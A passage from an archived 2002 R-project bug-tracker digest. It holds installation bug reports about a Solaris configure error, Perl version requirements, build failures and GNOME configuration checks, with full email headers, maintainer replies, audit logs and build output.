after installing R, bash stopped running. At first, I couldn't figure out 
at all what happened. It turned out that bash failed to runs because it 
lost access dynamic libraries in /usr/local/lib directory.)

I hope the installer properly follows symbolic links during installation.

Cheers,
Kow


==> 1825.audit <==
Wed Jul 24 08:41:23 2002	ripley	changed notes
Wed Jul 24 08:41:23 2002	ripley	foobar
Wed Jul 24 08:41:23 2002	ripley	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1829 *
Subject: R config failure on solaris
From: "Siva Ginjupalli" <gsivrao@hotmail.com>
Date: Wed, 24 Jul 2002 20:08:49 +0000
--Missing info on R version and compilers.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1829 <==
From postmaster@franz.stat.wisc.edu  Wed Jul 24 22:09:46 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA15079
	for <r-bugs@biostat.ku.dk>; Wed, 24 Jul 2002 22:09:45 +0200 (MET DST)
Received: from hotmail.com (really [216.33.237.9]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17XSRV-000IWqC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Wed, 24 Jul 2002 15:09:05 -0500 (CDT) 
Received: from mail pickup service by hotmail.com with Microsoft SMTPSVC;
	 Wed, 24 Jul 2002 13:08:49 -0700
Received: from 66.12.38.242 by lw7fd.law7.hotmail.msn.com with HTTP;
	Wed, 24 Jul 2002 20:08:49 GMT
X-Originating-IP: [66.12.38.242]
From: "Siva Ginjupalli" <gsivrao@hotmail.com>
To: r-bugs@r-project.org
Subject: R config failure on solaris
Date: Wed, 24 Jul 2002 20:08:49 +0000
Mime-Version: 1.0
Content-Type: text/plain; format=flowed
Message-ID: <F9NUyKhy7uQP5F1iVbC00014ae6@hotmail.com>
X-OriginalArrivalTime: 24 Jul 2002 20:08:49.0356 (UTC) FILETIME=[EC86F0C0:01C2334D]

Dear sir,

This is siva Ginjupalli.

I am getting following error while configuring my Solaris for "R" software.

checking size of int... configure: error: cannot compute sizeof (int), 77.

My solaris information as follows:

uname -m = sun4u
uname -r = 5.8
uname -s = SunOS
uname -v = Generic_108528-01

/usr/bin/uname -p = sparc
/bin/uname -X     = System = SunOS
Release = 5.8
KernelID = Generic_108528-01
Machine = sun4u
BusType = <unknown>
Serial = <unknown>
Users = <unknown>
OEM# = 0
Origin# = 1
NumCPU = 2

I really appreciate if you could guide me to resolve this problem.

Please let me know, if you need config.log file to debug

Thanks
Siva

_________________________________________________________________
MSN Photos is the easiest way to share and print your photos: 
http://photos.msn.com/support/worldwide.aspx


==> 1829.audit <==
Tue Jul 30 11:53:41 2002	ripley	foobar
Tue Jul 30 11:53:41 2002	ripley	moved from incoming to Installation
Mon Sep 16 13:28:55 2002	pd	changed notes
Mon Sep 16 13:28:55 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1937 *
Subject:  Inconsistent use of Perl? 
From: Berwin Turlach <berwin@maths.uwa.edu.au>
Date: Sat, 24 Aug 2002 18:41:09 +0800
--Some packages require Perl v 5.005
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1937 <==
From postmaster@franz.stat.wisc.edu  Sat Aug 24 12:42:04 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA26898
	for <r-bugs@biostat.ku.dk>; Sat, 24 Aug 2002 12:42:03 +0200 (MET DST)
Received: from asclepius.uwa.edu.au (really [130.95.128.56]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17iYM2-000IZDC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Sat, 24 Aug 2002 05:41:18 -0500 (CDT) 
Received: from 127.0.0.1 (localhost [127.0.0.1])
	by dummy.domain.name (Postfix) with SMTP id 6A6372F87D3
	for <r-bugs@r-project.org>; Sat, 24 Aug 2002 18:41:11 +0800 (WST)
Received: from bossiaea.maths.uwa.edu.au (bossiaea.maths.uwa.edu.au [130.95.16.247])
	by asclepius.uwa.edu.au (Postfix) with ESMTP id 316882F87A1
	for <r-bugs@r-project.org>; Sat, 24 Aug 2002 18:41:11 +0800 (WST)
Received: (from berwin@localhost)
	by bossiaea.maths.uwa.edu.au (8.9.3/8.9.3) id SAA06066;
	Sat, 24 Aug 2002 18:41:09 +0800
Date: Sat, 24 Aug 2002 18:41:09 +0800
From: Berwin Turlach <berwin@maths.uwa.edu.au>
Message-Id: <200208241041.SAA06066@bossiaea.maths.uwa.edu.au>
To: r-bugs@r-project.org
Subject:  Inconsistent use of Perl? 
Cc: berwin@bossiaea.maths.uwa.edu.au

Dear all

yesterday I got around to install R-1.5.1 on my machine at home which,
admittedly, is running a very old version of RedHat Linux.  I noticed
two things:

1) My pdflatex version is too old to produce the pdf version of the
   manuals.  `./configure' checks whether a recent version of makeinfo
is installed and tells you whether you can produce the info version or
not.  (I was told I couldn't, another reason to upgrate the machine.)
But during configuration there don't seem to be any check whether the
pdflatex is recent enough.  You might want to consider to add such a
check.

2) `./configure' checks whether Perl 5.004 (or later) is installed.
   On my machine Perl 5.00405 is installed and the installation went
ahead without problems.  However, when I then tried to install
R-1.5.1-recommended by issuing the command
        R CMD INSTALL *.tar.gz
in the appropriate directory, I received complaints about my Perl
version.  Essentially, R wanted all of a sudden Perl 5.005 (or
later).  An edited version of what I saw on my terminal is included
below.  I got the same kind of error message when I used from within R
`update.packages' and `install.packages' to update/install some
packages that are not in R-1.5.1-recommended.
As far as I can tell, the installation of the packages went ahead fine
except that the `TITLE' file for each of these packages is empty.
Hence, I guess the error message is produced when R tries to generate
and install the `TITLE' file.  However, the `TITLE' files for the
packages in the base distribution are fine.  This leaves me wondering
why during the base installation Perl 5.004 (or later) is good enough
for producing the `TITLE' file but for `R CMD INSTALL' Perl 5.005 (or
later) is required.   

Cheers,

        Berwin


----- Edited output from attempt to install R-1.5.1-recommended -----
absentia:/opt/R/R-1.5.1-recommended$ R CMD INSTALL *.tar.gz
Contains: MASS class nnet spatial
* Installing *source* package 'KernSmooth' ...
** libs
[...]
gcc -shared  -o KernSmooth.so blkest.o cp.o dgedi.o dgefa.o dgesl.o linbin.o linbin2D.o locpoly.o rlbin.o sdiag.o sstdiag.o   -L/usr/local/lib -L/usr/local/share/icon.9.3.1/ilib -L/usr/local/lib/gcc-lib/i686-pc-linux-gnu/2.95.2 -L/usr/local/i686-pc-linux-gnu/lib -lreadline -ldl -lncurses -lg2c -lm 
** R
** data
Perl 5.005 required--this is only version 5.00405, stopped at /usr/local/lib/R/share/perl/maketitle.pl line 4.
** help
 >>> Building/Updating help pages for package `KernSmooth'
     Formats: text html latex example 
* DONE (KernSmooth)

* Installing *source* package 'MASS' ...
** libs
gcc -I/usr/local/lib/R/include  -I/usr/local/include -D__NO_MATH_INLINES -mieee-fp  -fPIC  -g -O2 -c MASS.c -o MASS.o
gcc -shared  -o MASS.so MASS.o    
** R
** data
** inst
Perl 5.005 required--this is only version 5.00405, stopped at /usr/local/lib/R/share/perl/maketitle.pl line 4.
** help
 >>> Building/Updating help pages for package `MASS'
     Formats: text html latex example 
  write.matrix                                              example
* DONE (MASS)

* Installing *source* package 'class' ...
** libs
gcc -I/usr/local/lib/R/include  -I/usr/local/include -D__NO_MATH_INLINES -mieee-fp  -fPIC  -g -O2 -c class.c -o class.o
gcc -shared  -o class.so class.o    
** R
** inst
Perl 5.005 required--this is only version 5.00405, stopped at /usr/local/lib/R/share/perl/maketitle.pl line 4.
** help
 >>> Building/Updating help pages for package `class'
     Formats: text html latex example 
* DONE (class)

* Installing *source* package 'nnet' ...
** libs
gcc -I/usr/local/lib/R/include  -I/usr/local/include -D__NO_MATH_INLINES -mieee-fp  -fPIC  -g -O2 -c nnet.c -o nnet.o
gcc -shared  -o nnet.so nnet.o    
** R
** inst
Perl 5.005 required--this is only version 5.00405, stopped at /usr/local/lib/R/share/perl/maketitle.pl line 4.
** help
 >>> Building/Updating help pages for package `nnet'
     Formats: text html latex example 
* DONE (nnet)

* Installing *source* package 'spatial' ...
** libs
[...]
gcc -shared  -o spatial.so init.o krc.o pps.o    
** R
** data
** inst
Perl 5.005 required--this is only version 5.00405, stopped at /usr/local/lib/R/share/perl/maketitle.pl line 4.
** help
 >>> Building/Updating help pages for package `spatial'
     Formats: text html latex example 
* DONE (spatial)

* Installing *source* package 'boot' ...
** R
** data
Perl 5.005 required--this is only version 5.00405, stopped at /usr/local/lib/R/share/perl/maketitle.pl line 4.
** help
[...]
* DONE (boot)

* Installing *source* package 'cluster' ...
** libs
[...]
gcc -shared  -o cluster.so clara.o daisy.o fanny.o meet.o mona.o pam.o spannel.o twins.o   -L/usr/local/lib -L/usr/local/share/icon.9.3.1/ilib -L/usr/local/lib/gcc-lib/i686-pc-linux-gnu/2.95.2 -L/usr/local/i686-pc-linux-gnu/lib -lreadline -ldl -lncurses -lg2c -lm 
** R
** data
Perl 5.005 required--this is only version 5.00405, stopped at /usr/local/lib/R/share/perl/maketitle.pl line 4.
** help
[...]


* Installing *source* package 'foreign' ...
[...]
** libs
[...]
gcc -shared  -o foreign.so SASxport.o avl.o file-handle.o format.o minitab.o pfm-read.o sfm-read.o spss.o stataread.o    
** R
Perl 5.005 required--this is only version 5.00405, stopped at /usr/local/lib/R/share/perl/maketitle.pl line 4.
** help
[...]


--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 5.1
 year = 2002
 month = 06
 day = 17
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


==> 1937.followup.1 <==
From ripley@stats.ox.ac.uk  Sat Aug 24 22:45:45 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA27626
	for <R-bugs@biostat.ku.dk>; Sat, 24 Aug 2002 22:45:45 +0200 (MET DST)
Received: from auk.stats (pc1-oxfd1-4-cust16.oxf.cable.ntl.com [62.254.131.16])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id VAA03733;
	Sat, 24 Aug 2002 21:44:46 +0100 (BST)
Date: Sat, 24 Aug 2002 21:43:21 +0100 (BST)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Sender: ripley@auk.stats
To: berwin@maths.uwa.edu.au
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: Inconsistent use of Perl? (PR#1937)
In-Reply-To: <200208241042.MAA26903@pubhealth.ku.dk>
Message-ID: <Pine.GSO.4.44.0208242134310.27087-100000@auk.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Sat, 24 Aug 2002 berwin@maths.uwa.edu.au wrote:

> Dear all
>
> yesterday I got around to install R-1.5.1 on my machine at home which,
> admittedly, is running a very old version of RedHat Linux.  I noticed
> two things:
>
> 1) My pdflatex version is too old to produce the pdf version of the
>    manuals.  `./configure' checks whether a recent version of makeinfo
> is installed and tells you whether you can produce the info version or
> not.  (I was told I couldn't, another reason to upgrate the machine.)
> But during configuration there don't seem to be any check whether the
> pdflatex is recent enough.  You might want to consider to add such a
> check.

Well, we would need to know which version failed.  What is yours?

doc/manuals/README mentions pdftex-0.14d.  *ANY* version older than 1.00
is unreleased and experimental, but versions as old as -0.13d have worked.

> 2) `./configure' checks whether Perl 5.004 (or later) is installed.
>    On my machine Perl 5.00405 is installed and the installation went
> ahead without problems.  However, when I then tried to install
> R-1.5.1-recommended by issuing the command
>         R CMD INSTALL *.tar.gz
> in the appropriate directory, I received complaints about my Perl
> version.  Essentially, R wanted all of a sudden Perl 5.005 (or
> later).  An edited version of what I saw on my terminal is included
> below.  I got the same kind of error message when I used from within R
> `update.packages' and `install.packages' to update/install some
> packages that are not in R-1.5.1-recommended.
> As far as I can tell, the installation of the packages went ahead fine
> except that the `TITLE' file for each of these packages is empty.
> Hence, I guess the error message is produced when R tries to generate
> and install the `TITLE' file.  However, the `TITLE' files for the
> packages in the base distribution are fine.  This leaves me wondering
> why during the base installation Perl 5.004 (or later) is good enough
> for producing the `TITLE' file but for `R CMD INSTALL' Perl 5.005 (or
> later) is required.

That is correct.  Most things require 5.004, a few require 5.005.
Why is that a bug?

The issue is the use of the Text::Wrap module in share/perl/R/Utils.pm,
where 5.004_05 was broken (we discovered).

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1937.followup.2 <==
From berwin@bossiaea.maths.uwa.edu.au  Sun Aug 25 13:13:34 2002
Received: from asclepius.uwa.edu.au (asclepius.uwa.edu.au [130.95.128.56])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA28674
	for <R-bugs@biostat.ku.dk>; Sun, 25 Aug 2002 13:13:30 +0200 (MET DST)
Received: from 127.0.0.1 (localhost [127.0.0.1])
	by dummy.domain.name (Postfix) with SMTP id 9A0AC2F8623
	for <R-bugs@biostat.ku.dk>; Sun, 25 Aug 2002 19:12:47 +0800 (WST)
Received: from bossiaea.maths.uwa.edu.au (bossiaea.maths.uwa.edu.au [130.95.16.247])
	by asclepius.uwa.edu.au (Postfix) with ESMTP id 76E7F2F8579
	for <R-bugs@biostat.ku.dk>; Sun, 25 Aug 2002 19:12:47 +0800 (WST)
Received: (from berwin@localhost)
	by bossiaea.maths.uwa.edu.au (8.9.3/8.9.3) id TAA07633;
	Sun, 25 Aug 2002 19:12:46 +0800
From: Berwin Turlach <berwin@maths.uwa.edu.au>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15720.48046.174752.611550@bossiaea.maths.uwa.edu.au>
Date: Sun, 25 Aug 2002 19:12:46 +0800 (WST)
To: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: Inconsistent use of Perl? (PR#1937)
In-Reply-To: <Pine.GSO.4.44.0208242134310.27087-100000@auk.stats>
References: <200208241042.MAA26903@pubhealth.ku.dk>
	<Pine.GSO.4.44.0208242134310.27087-100000@auk.stats>
X-Mailer: VM 6.75 under Emacs 19.34.1

>>>>> "BDR" == Prof Brian D Ripley <ripley@stats.ox.ac.uk> writes:

  BDR> On Sat, 24 Aug 2002 berwin@maths.uwa.edu.au wrote:
  >> [...]  But during configuration there don't seem to be any check
  >> whether the pdflatex is recent enough.  You might want to
  >> consider to add such a check.

  BDR> Well, we would need to know which version failed.  What is
  BDR> yours?
0.12h it seems.  (See below).  The hyperref package coming with that
installation is also too old, it seems....

  >> [...]  This leaves me wondering why during the base installation
  >> Perl 5.004 (or later) is good enough for producing the `TITLE'
  >> file but for `R CMD INSTALL' Perl 5.005 (or later) is required.

  BDR> That is correct.  Most things require 5.004, a few require
  BDR> 5.005.  Why is that a bug?
Did I claim it was a bug? :) Anyway, from the FAQ:

    If a command you are familiar with causes an R error message in a
    case where its usual definition ought to be reasonable, it is
    probably a bug.

After installing R and knowing that `./configure' checks which Perl
version I have, I expect to have a system that works fine and doesn't
all of a sudden tell me that my Perl version is too old and cannot
perform a `complete' install of addtional packages.  If part of R
needs Perl 5.005, why don't you check for Perl 5.005?  O.k., you can
argue that it wasn't an error message but just a warning, or that I am
not familiar with the command (fair enough too :-) ), but the FAQ
continues:

   If you aren't familiar with the command, or don't know for certain
   how the command is supposed to work, then it might actually be
   working right. Rather than jumping to conclusions, show the problem
   to someone who knows for certain.

And I did exactly the latter, labeling my report `inconsistent use of
Perl'.  Rest assured, if I think something is a bug, then I will say
so in the subject line. :)

Cheers,

        Berwin

----- Attempt of "make pdf" -----
absentia:/opt/R/R-1.5.1$ make pdf
make[1]: Entering directory `/opt/R/R-1.5.1/doc'
make[2]: Entering directory `/opt/R/R-1.5.1/doc/manual'
PDF/LaTeX documentation: reference index ...
This is pdfTeX, Version 3.14159-0.12h (Web2C 7.2)
(pdftex.cfg)<acrobat.map><lw35extra_urw.map><charter.map><omega.map><utopia.map
><xypic.map><hoekwater.map><bsr.map><bakomaextra.map>
LaTeX2e <1998/06/01>
Babel <v3.6j> and hyphenation patterns for american, french, german,
italian, n
ohyphenation, loaded.

(refman.tex (/usr/share/texmf/tex/latex/base/book.cls
Document Class: book 1998/05/05 v1.3y Standard LaTeX document class
(/usr/share/texmf/tex/latex/base/bk10.clo)) (../../share/texmf/Rd.sty
(/usr/share/texmf/tex/latex/base/ifthen.sty)
(/usr/share/texmf/tex/latex/tools/longtable.sty)
(/usr/share/texmf/tex/latex/tools/bm.sty)
(/usr/share/texmf/tex/latex/base/alltt.sty)
(/usr/share/texmf/tex/latex/tools/verbatim.sty)
(/usr/share/texmf/tex/latex/misc/url.sty) NOT loading ae
(/usr/share/texmf/tex/latex/graphics/color.sty
(/usr/share/texmf/tex/latex/config/color.cfg)
(/usr/share/texmf/tex/latex/graphics/pdftex.def))
(/usr/share/texmf/tex/latex/hyperref/hyperref.sty
(/usr/share/texmf/tex/latex/graphics/keyval.sty)
(/usr/share/texmf/tex/latex/hyperref/nameref.sty)
(../../share/texmf/hyperref.cfg

! Package keyval Error: linktocpage undefined.

See the keyval package documentation for explanation.
Type  H <return>  for immediate help.
 ...                                              
                                                  
l.12 }
      
) (/usr/share/texmf/tex/latex/hyperref/backref.sty))
(/usr/share/texmf/tex/latex/hyperref/hpdftex.def
(/usr/share/texmf/tex/latex/psnfss/pifont.sty
(/usr/share/texmf/tex/latex/psnfss/upzd.fd)
(/usr/share/texmf/tex/latex/psnfss/upsy.fd))))
(/usr/share/texmf/tex/latex/base/makeidx.sty)
Writing index file refman.idx
No file refman.aux.
(/usr/share/texmf/tex/context/base/supp-pdf.tex
(/usr/share/texmf/tex/context/ppchtex/supp-mis.tex
loading : Context Support Macros / Missing
)
loading : Context Support Macros / PDF
) (refman.out) (refman.out)
Overfull \hbox (437.54385pt too wide) in paragraph at lines 9--11
[]\OT1/cmr/m/n/10 null null null
        
                                                                               
                                                                               
                                                                               
                                                                     
[1] [2] (version.tex) (/usr/share/texmf/tex/latex/base/omscmr.fd)
Warning (ext1): destination with the same identifier already exists!
Underfull \hbox (badness 10000) has occurred while \output is active
[]\OT1/cmr/m/n/10 null null null
[1]
Underfull \hbox (badness 10000) has occurred while \output is active
[]\OT1/cmr/m/n/10 null null null
[1] [2] (base-pkg.tex
Chapter 1.

Underfull \hbox (badness 10000) has occurred while \output is active
[]\OT1/cmr/m/n/10 null null null
[1] [2] [3] [4] [5] [6] [7] [8] [9] [10] [11] [12] [13] [14] [15] [16]
[17]
[18] [19] [20] [21] [22] [23] [24] [25] [26] [27] [28] [29] [30] [31]
[32]
[33] [34] [35] [36] [37] [38] [39] [40] [41] [42] [43] [44] [45] [46]
[47]
[48] [49] [50] [51]
Underfull \hbox (badness 1789) in paragraph at lines 2686--2689
[]\OT1/cmr/m/n/10 further graph-i-cal pa-ram-e-ters
([][]\OT1/cmtt/m/n/10 par[]
[][][][]\OT1/cmr/m/n/10 ) are passed to [][]\OT1/cmtt/m/n/10
plot.window[][][](
)[][]\OT1/cmr/m/n/10 ,
[52] [53] [54] [55] [56] [57] [58]
Underfull \hbox (badness 1292) in paragraph at lines 3102--3104
[]\OT1/cmr/m/n/10 Catherine Loader (2000). \OT1/cmr/m/it/10 Fast and
Ac-cu-rate
 Com-pu-ta-tion of Bi-no-mial Prob-a-bil-i-
[59] [60] [61] [62] [63] [64] [65] [66] [67] [68] [69] [70]
Overfull \hbox (14.27731pt too wide) in paragraph at lines 3707--3707
 []    \OT1/cmtt/m/n/10 log = "", pars = NULL, frame.plot = axes,
horizontal = 
FALSE, add = FALSE,[] 
[71] [72] [73] [74] [75] [76] [77] [78] [79] [80] [81] [82] [83] [84]
[85]
[86] [87] [88] [89] [90] [91] [92] [93] [94] [95] [96] [97] [98] [99]
[100]
[101] [102] [103] [104] [105] [106] [107] [108] [109] [110]
Underfull \vbox (badness 10000) has occurred while \output is active
[111]
[112]
Underfull \hbox (badness 2326) in paragraph at lines 5982--5984
[]\OT1/cmr/m/n/10 logical in-di-cat-ing whether axes or a box should
be drawn, 
see
[113] [114] [115] [116] (../../share/texmf/omscmtt.fd) [117] [118]
[119]
[120] [121] [122] [123] [124] [125] [126] [127] [128] [129] [130]
[131]
[132] [133]
Underfull \hbox (badness 1755) in paragraph at lines 7135--7139
[][][]\OT1/cmtt/m/n/10 print.data.frame[][][][][]\OT1/cmr/m/n/10 ,
[][]\OT1/cmt
t/m/n/10 read.table[][][][][]\OT1/cmr/m/n/10 , [][]\OT1/cmtt/m/n/10
Math.data.f
rame[][][][][] \OT1/cmr/m/n/10 etc, about \OT1/cmr/m/it/10 Group
\OT1/cmr/m/n/1
0 meth-ods for
[134] [135] [136] [137] [138] [139] [140] [141] [142] [143] [144]
[145]
[146] [147] [148] [149] [150] [151] [152] [153] [154] [155] [156]
[157]
Underfull \hbox (badness 7116) in paragraph at lines 8575--8577
[]\OT1/cmr/m/n/10 The de-fault for \OT1/cmtt/m/n/10 dev.print
\OT1/cmr/m/n/10 i
s to pro-duce and print a postscript copy, if
[158] [159] [160] [161] [162] [163] [164] [165] [166] [167] [168]
[169]
[170] [171] [172] [173] [174] [175] [176] [177] [178] [179] [180]
[181]
[182] [183] [184] [185] [186] [187] [188] [189] [190] [191]
Underfull \hbox (badness 4254) in paragraph at lines 10463--10465
[]\OT1/cmr/m/n/10 a frame in the call-ing list. Equiv-a-lent to
giv-ing \OT1/cm
tt/m/n/10 where \OT1/cmr/m/n/10 as
[192] [193] [194] [195]
! TeX capacity exceeded, sorry [input stack size=300].
\@inmathwarn ...latex@warning {Command \protect #1
                                                   invalid in math
mode}\fi 
l.10696 \alias{\$}{Extract}
                           
!  ==> Fatal error occurred, the output PDF file not finished!
Transcript written on refman.log.
make[2]: *** [refman.pdf] Error 1
make[2]: Leaving directory `/opt/R/R-1.5.1/doc/manual'
make[1]: *** [pdf] Error 2
make[1]: Leaving directory `/opt/R/R-1.5.1/doc'
make: [pdf] Error 2 (ignored)
absentia:/opt/R/R-1.5.1$ 


==> 1937.audit <==
Fri Aug 30 17:59:02 2002	thomas	moved from incoming to Installation
Mon Sep 16 13:30:57 2002	pd	changed notes
Mon Sep 16 13:30:57 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1995 *
Subject:  2002-09-08 1.6.0 build fails in Recommended 
From: <stvjc@channing.harvard.edu>
Date: Sun, 8 Sep 2002 23:57:39 -0400 (EDT)
--I think this got cleared up...
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1995 <==
From postmaster@franz.stat.wisc.edu  Mon Sep  9 05:58:21 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id FAA19178
	for <r-bugs@biostat.ku.dk>; Mon, 9 Sep 2002 05:58:21 +0200 (MET DST)
Received: from riemann.bwh.harvard.edu (really [134.174.249.25]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17oFgE-000IY7C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Sun, 8 Sep 2002 22:57:42 -0500 (CDT) 
Received: from capecod.bwh.harvard.edu (capecod [134.174.249.30])
	by riemann.bwh.harvard.edu (8.9.3/8.9.3) with ESMTP id XAA20855;
	Sun, 8 Sep 2002 23:57:39 -0400 (EDT)
From: <stvjc@channing.harvard.edu>
Received: (from stvjc@localhost)
	by capecod.bwh.harvard.edu (8.8.5/8.8.5) id XAA14730;
	Sun, 8 Sep 2002 23:57:39 -0400 (EDT)
Date: Sun, 8 Sep 2002 23:57:39 -0400 (EDT)
Message-Id: <200209090357.XAA14730@capecod.bwh.harvard.edu>
To: r-bugs@r-project.org
Cc: stvjc@channing.harvard.edu
Subject:  2002-09-08 1.6.0 build fails in Recommended 


<<insert bug report here>>

in src/library/Recommended, make yields

make: *** No rule to make target `survival.ts', needed by `all'.  Stop.

this kills the build.  but "make check" succeeds



--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = Under development (unstable)
 major = 1
 minor = 6.0
 year = 2002
 month = 09
 day = 08
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

==> 1995.reply.1 <==
From p.dalgaard@biostat.ku.dk  Mon Sep  9 08:48:43 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA19679;
	Mon, 9 Sep 2002 08:48:42 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id g896mf803032;
	Mon, 9 Sep 2002 08:48:41 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: stvjc@channing.harvard.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: 2002-09-08 1.6.0 build fails in Recommended (PR#1995)
References: <200209090358.FAA19184@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 09 Sep 2002 08:48:41 +0200
In-Reply-To: <200209090358.FAA19184@pubhealth.ku.dk>
Message-ID: <x2sn0jvet2.fsf@biostat.ku.dk>
Lines: 23
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

stvjc@channing.harvard.edu writes:

> <<insert bug report here>>
> 
> in src/library/Recommended, make yields
> 
> make: *** No rule to make target `survival.ts', needed by `all'.  Stop.
> 
> this kills the build.  but "make check" succeeds
> 

Did you run tools/rsync-recommended? (See
http://developer.r-project.org/devel-guidelines.txt)

(Vince, I'd appreciate a slightly longer fuse before having *changes*
in the build procedure for the development version show up on the
public bug lists. You might have asked R-core.)

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1995.audit <==
Tue Sep 10 16:09:24 2002	thomas	moved from incoming to Installation
Mon Sep 16 13:29:45 2002	pd	changed notes
Mon Sep 16 13:29:45 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1996 *
Subject:  config checks for --with-gnome need update 
From: <stvjc@channing.harvard.edu>
Date: Mon, 9 Sep 2002 00:08:59 -0400 (EDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1996 <==
From postmaster@franz.stat.wisc.edu  Mon Sep  9 06:09:40 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA19228
	for <r-bugs@biostat.ku.dk>; Mon, 9 Sep 2002 06:09:39 +0200 (MET DST)
Received: from riemann.bwh.harvard.edu (really [134.174.249.25]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17oFrB-000IY7C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Sun, 8 Sep 2002 23:09:01 -0500 (CDT) 
Received: from capecod.bwh.harvard.edu (capecod [134.174.249.30])
	by riemann.bwh.harvard.edu (8.9.3/8.9.3) with ESMTP id AAA20984;
	Mon, 9 Sep 2002 00:09:00 -0400 (EDT)
From: <stvjc@channing.harvard.edu>
Received: (from stvjc@localhost)
	by capecod.bwh.harvard.edu (8.8.5/8.8.5) id AAA06598;
	Mon, 9 Sep 2002 00:08:59 -0400 (EDT)
Date: Mon, 9 Sep 2002 00:08:59 -0400 (EDT)
Message-Id: <200209090408.AAA06598@capecod.bwh.harvard.edu>
To: r-bugs@r-project.org
Cc: stvjc@channing.harvard.edu
Subject:  config checks for --with-gnome need update 


<<insert bug report here>>

if, e.g., libgnomeui.a is not present, the build for a --with-gnome
configuration will fail.  (for my plain RH 7.2 a number of *-devel-*
rpms needed to be added to get the required libraries: 
gnome-libs-devel,  gtk+-devel, glib-devel, libglade-devel.)


--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = Under development (unstable)
 major = 1
 minor = 6.0
 year = 2002
 month = 09
 day = 08
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

==> 1996.audit <==
Tue Sep 10 16:09:24 2002	thomas	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Language

* PR# 408 *
Subject: convolution bug
From: wsimpson@gcal.ac.uk
Date: Fri, 28 Jan 2000 11:17:36 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 408 <==
From wsimpson@gcal.ac.uk  Fri Jan 28 11:17:36 2000
Received: from localhost (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA11325
	for <R-bugs@biostat.ku.dk>; Fri, 28 Jan 2000 11:17:36 +0100 (MET)
